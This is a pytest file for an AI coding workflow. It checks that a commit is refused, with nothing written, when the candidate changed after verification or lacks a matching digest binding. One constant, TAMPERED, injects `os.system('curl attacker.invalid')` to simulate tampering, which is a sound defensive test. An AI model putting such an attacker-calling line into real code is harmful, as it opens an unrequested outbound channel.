"""CANDIDATE-VERIFIED-DIGEST-BINDING-001: the committed batch is bound to the
batch terminal verification judged, whether static analysis is enabled or not.

- The binding covers every entry's normalized path, operation, exact bytes
  (or deletion marker), mode and base identity, canonically.
- ``commit_terminal_candidate`` recomputes it before anything else and refuses
  a missing or different binding with nothing written
  (VERIFIED_CANDIDATE_EVIDENCE_MISSING / _STALE), whatever static analysis says.
- Both commit paths bind and enforce it: the direct/milestone pre-apply
  boundary (after the candidate gates) and the enforce TerminalGateService
  (before its first gate). The refusal is the deterministic workspace-commit
  stop: never a Developer retry, reported in the result, the RunRecord and
  the CLI.
"""
import ast
import os
import shutil
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from _chaos_harness import inject_after_static_analysis_gate, snapshot_tree
from _fake_static_analysis import DISABLED_STATIC_ANALYSIS, FakeRegistration
from _milestone_proof_harness import _milestone, git_workspace  # noqa: F401 - pytest fixture
from test_prd008a_plan_executor import (  # noqa: F401 - pytest fixture
    CALC,
    CALC_WITH_SUB,
    _config,
    _role_llm,
    calc_workspace,
)
from test_prd031a_static_analysis import BASE_A, _evaluate, _workspace, _write
from test_prd031a_static_analysis import _config as _static_analysis_config
from test_workflow_controller_enforce import _patched, _workflow_engine

import kriya.workflow.terminal_commit as terminal_commit_module
from kriya.cli import _print_workspace_commit_failure
from kriya.control.persistence import scan_run_records
from kriya.control.run_record import RunLifecycle
from kriya.core.kernel import Kernel
from kriya.static_analysis import model as sa_model
from kriya.static_analysis.service import commit_guard
from kriya.workflow.milestones import MilestoneRunState, run_milestones
from kriya.workflow.plan_schema import EngineeringPlan, ExecutionMethod, FileAction, PlannedFile, Subtask
from kriya.workflow.terminal_commit import commit_terminal_candidate
from kriya.workflow.triage import ChangeKind
from kriya.workflow.verification_binding import (
    VERIFIED_CANDIDATE_EVIDENCE_MISSING,
    VERIFIED_CANDIDATE_EVIDENCE_STALE,
    bind_candidate,
)
from kriya.workflow.workflow import WorkflowEngine
from kriya.workflow.workflow_controller import WorkflowController

ROOT = Path(__file__).resolve().parents[1]
TAMPERED = CALC_WITH_SUB + "\nimport os\nos.system('curl attacker.invalid')\n"


@pytest.fixture(autouse=True)
def _waiver_home(tmp_path, monkeypatch):
    monkeypatch.setenv("KRIYA_STATIC_ANALYSIS_HOME", str(tmp_path / "waiver-home"))


# --- The binding ------------------------------------------------------------------

FILES = {"A.java": BASE_A, "gone.py": "GONE = 1\n"}


def _verified_batch(workspace):
    """A modify, an add and a delete: every operation in one batch."""
    return [_write(workspace, "A.java", "class A { }\n", base=BASE_A),
            _write(workspace, "pkg/new.py", "NEW = 1\n"),
            _write(workspace, "gone.py", None, base="GONE = 1\n")]


def test_the_binding_is_canonical_and_independent_of_batch_order_and_workspace_spelling(tmp_path):
    workspace = _workspace(tmp_path, FILES)
    link = tmp_path / "link"
    os.symlink(workspace, link)
    batch = _verified_batch(workspace)
    assert bind_candidate(batch, workspace) == bind_candidate(list(reversed(batch)), workspace)
    assert bind_candidate(batch, workspace).digest == bind_candidate(batch, str(link)).digest
    assert [entry[:2] for entry in bind_candidate(batch, workspace).entries] == [
        ("A.java", "modify"), ("gone.py", "delete"), ("pkg/new.py", "add")]


@pytest.mark.parametrize("field,change", [
    ("content_bytes", lambda w: replace(w, content_bytes=b"class A { int y; }\n")),
    ("mode", lambda w: replace(w, mode=0o755)),
    ("delete", lambda w: replace(w, delete=True)),
    ("expected_base_revision", lambda w: replace(w, expected_base_revision="sha256:other")),
    ("expected_base_exists", lambda w: replace(w, expected_base_exists=False)),
    ("target_path", lambda w: replace(w, target_path=w.target_path.replace("A.java", "B.java"))),
])
def test_every_entry_component_is_bound(tmp_path, field, change):
    workspace = _workspace(tmp_path, FILES)
    batch = _verified_batch(workspace)
    changed = [change(batch[0]), *batch[1:]]
    assert bind_candidate(changed, workspace).digest != bind_candidate(batch, workspace).digest, field


# --- The commit seam, static analysis disabled -------------------------------------------

def _refused(tmp_path, workspace, verified, committed_batch, reason=VERIFIED_CANDIDATE_EVIDENCE_STALE):
    before = snapshot_tree(tmp_path)
    outcome = commit_terminal_candidate(
        committed_batch, workspace_path=workspace, transaction_id="tx",
        static_analysis=DISABLED_STATIC_ANALYSIS, verified_candidate=verified,
    )
    assert not outcome.committed and outcome.workspace_state == "UNCHANGED"
    assert outcome.reason_code == reason
    assert outcome.failure_payload()["commit_result"] == "NOT_COMMITTED"
    # Nothing written anywhere: no source byte, no intent, no commit evidence.
    assert snapshot_tree(tmp_path) == before
    return outcome


def test_an_unchanged_candidate_commits_normally(tmp_path):
    workspace = _workspace(tmp_path, FILES)
    batch = _verified_batch(workspace)
    outcome = commit_terminal_candidate(
        batch, workspace_path=workspace, transaction_id="tx", static_analysis=DISABLED_STATIC_ANALYSIS,
        verified_candidate=bind_candidate(_verified_batch(workspace), workspace),
    )
    assert outcome.committed and outcome.workspace_state == "COMMITTED"
    assert Path(workspace, "A.java").read_text() == "class A { }\n"
    assert Path(workspace, "pkg/new.py").read_text() == "NEW = 1\n"
    assert not Path(workspace, "gone.py").exists()


@pytest.mark.parametrize("case,mutate,named", [
    ("added file changed", lambda ws, batch: [batch[0], _write(ws, "pkg/new.py", "NEW = 2\n"), batch[2]],
     "pkg/new.py (content or base changed)"),
    ("modified file changed", lambda ws, batch: [_write(ws, "A.java", "class A { evil(); }\n", base=BASE_A),
                                                 *batch[1:]], "A.java (content or base changed)"),
    ("deletion set changed", lambda ws, batch: batch[:2], "gone.py (removed from the batch)"),
    ("path set changed", lambda ws, batch: [*batch, _write(ws, "extra.py", "X = 1\n")],
     "extra.py (added to the batch)"),
    ("operation changed", lambda ws, batch: [batch[0], batch[1], _write(ws, "gone.py", "GONE = 1\n",
                                                                         base="GONE = 1\n")],
     "gone.py (operation changed)"),
])
def test_a_candidate_changed_after_verification_is_refused_with_nothing_written(tmp_path, case, mutate, named):
    workspace = _workspace(tmp_path, FILES)
    verified = bind_candidate(_verified_batch(workspace), workspace)
    outcome = _refused(tmp_path, workspace, verified, mutate(workspace, _verified_batch(workspace)))
    assert named in str(outcome.error), case
    assert Path(workspace, "A.java").read_text() == BASE_A and Path(workspace, "gone.py").exists()


def test_a_missing_binding_is_refused_even_for_an_empty_batch(tmp_path):
    workspace = _workspace(tmp_path, FILES)
    _refused(tmp_path, workspace, None, _verified_batch(workspace), VERIFIED_CANDIDATE_EVIDENCE_MISSING)
    _refused(tmp_path, workspace, None, [], VERIFIED_CANDIDATE_EVIDENCE_MISSING)


# --- The binding and static analysis are independent requirements -------------------------

def _sa_commit(workspace, batch, verified, cfg, result):
    return commit_terminal_candidate(
        batch, workspace_path=workspace, transaction_id="tx",
        static_analysis=commit_guard(cfg, result), verified_candidate=verified,
    )


def test_static_analysis_enabled_needs_both_the_binding_and_the_static_analysis_authorization(tmp_path):
    workspace = _workspace(tmp_path, {"A.java": BASE_A})
    batch = [_write(workspace, "A.java", "class A { }\n", base=BASE_A)]
    verified = bind_candidate(batch, workspace)
    with FakeRegistration():
        cfg = _static_analysis_config()
        result = _evaluate(cfg, workspace, batch, tmp_path)
        assert result.permits_commit
        no_binding = _sa_commit(workspace, batch, None, cfg, result)
        no_evidence = _sa_commit(workspace, batch, verified, cfg, None)
        assert Path(workspace, "A.java").read_text() == BASE_A
        both = _sa_commit(workspace, batch, verified, cfg, result)
    assert no_binding.reason_code == VERIFIED_CANDIDATE_EVIDENCE_MISSING and not no_binding.committed
    assert no_evidence.reason_code == sa_model.STATIC_ANALYSIS_EVIDENCE_MISSING and not no_evidence.committed
    assert both.committed and Path(workspace, "A.java").read_text() == "class A { }\n"


def test_a_stale_binding_is_not_rescued_by_valid_static_analysis_evidence(tmp_path):
    """The scanner judged exactly the bytes about to be committed and permits
    them; the deterministic gates did not judge them. Refused."""
    workspace = _workspace(tmp_path, {"A.java": BASE_A})
    verified = bind_candidate([_write(workspace, "A.java", "class A { }\n", base=BASE_A)], workspace)
    swapped = [_write(workspace, "A.java", "class A { int untested; }\n", base=BASE_A)]
    with FakeRegistration():
        cfg = _static_analysis_config()
        result = _evaluate(cfg, workspace, swapped, tmp_path)
        assert result.permits_commit
        assert commit_guard(cfg, result).verify(swapped, workspace) is None  # the evidence itself is valid
        outcome = _sa_commit(workspace, swapped, verified, cfg, result)
    assert not outcome.committed and outcome.reason_code == VERIFIED_CANDIDATE_EVIDENCE_STALE
    assert Path(workspace, "A.java").read_text() == BASE_A


def test_a_valid_binding_cannot_bypass_blocking_static_analysis_evidence(tmp_path):
    workspace = _workspace(tmp_path, {"A.java": BASE_A})
    batch = [_write(workspace, "A.java", "x BAD_HIGH\n", base=BASE_A)]
    with FakeRegistration():
        cfg = _static_analysis_config()
        result = _evaluate(cfg, workspace, batch, tmp_path)
        assert result.outcome is sa_model.Outcome.BLOCKED
        outcome = _sa_commit(workspace, batch, bind_candidate(batch, workspace), cfg, result)
    assert not outcome.committed and outcome.reason_code == sa_model.STATIC_ANALYSIS_NOT_PERMITTED
    assert Path(workspace, "A.java").read_text() == BASE_A


# --- Direct and milestone: the real pipeline, static analysis disabled ------------------------

GOAL = "add sub to calc.py"


def _tamper(workspace):
    def action(state):
        assert state.verified_candidate_binding is not None
        Path(workspace, ".kriya", "worktree", "calc.py").write_text(TAMPERED)
    return action


def _invoke(mode, workspace, monkeypatch, action):
    cfg = _config()
    assert cfg.static_analysis.enabled is False
    llm = _role_llm(cfg, CALC_WITH_SUB)
    engine = WorkflowEngine(Kernel(config=cfg), llm)
    engine.run_verifier.judge = AsyncMock(return_value={"should_run": False, "run_commands": None})
    inject_after_static_analysis_gate(monkeypatch, action)
    import asyncio

    if mode == "direct":
        result = asyncio.run(engine.run_generation_workflow(goal=GOAL, workspace_path=str(workspace)))
    else:
        state = MilestoneRunState(group_id="grp", original_goal=GOAL, milestones=[_milestone("M1")])
        result = asyncio.run(run_milestones(engine, state, str(workspace)))
    developer_calls = sum(
        1 for call in llm.complete.call_args_list if "Developer Agent" in (call.args[0] or "").splitlines()[0])
    return result, developer_calls


@pytest.mark.parametrize("mode", ["direct", "milestone"])
def test_a_candidate_changed_after_the_gates_is_never_committed(mode, calc_workspace, monkeypatch):  # noqa: F811 - pytest fixture
    result, developer_calls = _invoke(mode, calc_workspace, monkeypatch, _tamper(calc_workspace))
    assert Path(calc_workspace, "calc.py").read_text() == CALC
    assert developer_calls == 1  # a deterministic stop, never a Developer retry
    [record] = scan_run_records(str(calc_workspace)).records
    assert record.lifecycle_state is RunLifecycle.FAILURE and record.terminal_status != "SUCCESS"
    assert record.commits == []  # refused before any commit intent
    if mode == "milestone":
        assert result["status"] == "milestone_failed" and result["committed_work_units"] == []
        result = result["result"]  # the unit's own pipeline result
    assert result["quality_gates_passed"] is False
    assert result["failure_category"] == "workspace_commit_failed"
    failure = result["workspace_commit_failure"]
    assert failure["reason_code"] == VERIFIED_CANDIDATE_EVIDENCE_STALE
    assert failure["workspace_state"] == "UNCHANGED"
    assert "calc.py" in failure["error"]


def test_the_control_run_without_tampering_commits(calc_workspace, monkeypatch):  # noqa: F811 - pytest fixture
    result, developer_calls = _invoke("direct", calc_workspace, monkeypatch, lambda state: None)
    assert result["quality_gates_passed"] is True and result["workspace_commit_failure"] is None
    assert Path(calc_workspace, "calc.py").read_text() == CALC_WITH_SUB and developer_calls == 1


def test_the_cli_names_the_refusal(calc_workspace, monkeypatch, capsys):  # noqa: F811 - pytest fixture
    result, _ = _invoke("direct", calc_workspace, monkeypatch, _tamper(calc_workspace))
    capsys.readouterr()
    _print_workspace_commit_failure(result)
    out = capsys.readouterr().out
    assert "[WORKSPACE COMMIT NOT COMPLETED]" in out and VERIFIED_CANDIDATE_EVIDENCE_STALE in out
    assert "changed after verification" in out and "workspace is unchanged" in out


# --- Enforce: the real controller, static analysis disabled ------------------------------

@pytest.mark.asyncio
@pytest.mark.parametrize("tamper", [False, True])
async def test_enforce_refuses_a_candidate_changed_after_its_gates_bound(tmp_path, monkeypatch, tamper):
    source = tmp_path / "app.py"
    source.write_text("original\n")
    plan = EngineeringPlan(plan_id="binding-enforce", kind=ChangeKind.TASK, subtasks=[Subtask(
        id="s1", description="update app", execution_method=ExecutionMethod.MODEL,
        planned_files=[PlannedFile(path="app.py", action=FileAction.MODIFY)])])
    sandbox = tmp_path / "plan-sandbox"

    def create_plan_sandbox(workspace):
        shutil.copytree(workspace, sandbox, ignore=shutil.ignore_patterns(".kriya", "plan-sandbox"))
        return str(sandbox)

    monkeypatch.setattr("kriya.workflow.workflow_controller.create_git_worktree", create_plan_sandbox)
    monkeypatch.setattr("kriya.workflow.workflow_controller.remove_git_worktree",
                        lambda workspace, candidate: shutil.rmtree(candidate, ignore_errors=True))

    async def fake_run(**kwargs):
        del kwargs
        (sandbox / "app.py").write_text("verified candidate\n")
        return {"status": "success", "quality_gates_passed": True, "files": ["app.py"]}

    events = []

    async def capture_event(name, payload):
        events.append((name, payload))

    we = _workflow_engine()
    we.run_generation_workflow = fake_run
    we.kernel = SimpleNamespace(
        registry=MagicMock(), events=SimpleNamespace(emit=AsyncMock(side_effect=capture_event)),
        config=SimpleNamespace(
            knowledge=SimpleNamespace(training_cutoff="2023-12-01", offline_mode=True, release_cache_ttl_days=30),
            llm=SimpleNamespace(knowledge_cutoff="2023-12-01"),
            skills=SimpleNamespace(load_global=False, load_cwd=False),
            paths=SimpleNamespace(skills=str(tmp_path / "skills"), memory=str(tmp_path / "memory")),
        ),
    )
    we.kernel.registry.list_components.return_value = []

    import kriya.workflow.workflow_controller as controller_module

    real_gate = controller_module.enforce_preserved_reference_terminal_integrity

    def gate_then_tamper(ledger, workspace):
        # A gate after the binding was taken: the candidate changes under it.
        if tamper:
            (sandbox / "app.py").write_text("tampered after verification\n")
        return real_gate(ledger, workspace)

    commit_calls = []
    real_commit = terminal_commit_module.commit_revision_grounded_batch

    def commit_spy(writes, *, workspace_path, transaction_id=None):
        commit_calls.append(workspace_path)
        return real_commit(writes, workspace_path=workspace_path, transaction_id=transaction_id)

    p1, p2, p3 = _patched(plan)
    with p1, p2, p3, patch(
        "kriya.workflow.workflow_controller.enforce_preserved_reference_terminal_integrity",
        side_effect=gate_then_tamper,
    ), patch("kriya.workflow.terminal_commit.commit_revision_grounded_batch", side_effect=commit_spy):
        result = await WorkflowController(we).execute("goal", str(tmp_path), migration_mode="enforce")

    legacy = result.legacy_result
    if not tamper:
        assert legacy["status"] == "success" and source.read_text() == "verified candidate\n"
        return
    assert source.read_text() == "original\n" and commit_calls == []
    assert legacy["status"] != "success" and legacy["quality_gates_passed"] is False
    assert VERIFIED_CANDIDATE_EVIDENCE_STALE in legacy["reason_codes"]
    [failed] = [payload for name, payload in events if name == "workspace_commit_failed"]
    assert failed["reason_code"] == VERIFIED_CANDIDATE_EVIDENCE_STALE and failed["workspace_state"] == "UNCHANGED"


# --- Structure: every real commit is bound ---------------------------------------------------

ALLOWED_BINDINGS = {"report.verified_candidate", "state.verified_candidate_binding"}


def test_every_production_commit_passes_the_binding_taken_at_verification():
    sites = []
    for path in sorted((ROOT / "kriya").rglob("*.py")):
        for node in ast.walk(ast.parse(path.read_text())):
            if isinstance(node, ast.Call) and getattr(node.func, "id", None) == "commit_terminal_candidate":
                [value] = [kw.value for kw in node.keywords if kw.arg == "verified_candidate"]
                sites.append((path.name, ast.unparse(value)))
    assert sorted(sites) == [("commit_service.py", "report.verified_candidate"),
                             ("workflow.py", "state.verified_candidate_binding")]
    assert {value for _, value in sites} == ALLOWED_BINDINGS
